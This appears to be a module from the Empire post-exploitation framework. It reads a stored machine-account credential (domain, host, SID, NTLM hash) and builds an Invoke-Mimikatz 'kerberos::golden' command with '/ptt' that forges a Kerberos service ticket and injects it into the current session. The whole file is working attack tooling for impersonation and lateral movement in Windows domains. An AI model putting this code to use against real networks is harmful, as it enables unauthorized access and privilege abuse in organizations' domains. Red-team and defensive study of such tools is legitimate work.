from empire.server.common import helpers
from empire.server.common.empire import MainMenu
from empire.server.core.db.base import SessionLocal
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source

class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":
            with SessionLocal() as db:
                cred = main_menu.credentialsv2.get_by_id(db, cred_id)

                if not cred:
                    raise ModuleValidationException("CredID is invalid!")

                if not cred.username.endswith("$"):
                    raise ModuleValidationException(
                        "[!] please specify a machine account credential"
                    )
                if cred.domain != "":
                    params["domain"] = cred.domain
                    if cred.host != "":
                        params["target"] = str(cred.host) + "." + str(cred.domain)
                if cred.sid != "":
                    params["sid"] = cred.sid
                if cred.password != "":
                    params["rc4"] = cred.password

        # error checking
        if not helpers.validate_ntlm(params["rc4"]):
            raise ModuleValidationException("rc4/NTLM hash not specified")

        if params["target"] == "":
            raise ModuleValidationException("target not specified")

        if params["sid"] == "":
            raise ModuleValidationException("domain SID not specified")

        # build the golden ticket command
        script_end = "Invoke-Mimikatz -Command '\"kerberos::golden"

        for option, values in params.items():
            if (
                option.lower() != "agent"
                and option.lower() != "credid"
                and values
                and values != ""
            ):
                script_end += " /" + str(option) + ":" + str(values)

        script_end += " /ptt\"'"

        return script, script_end
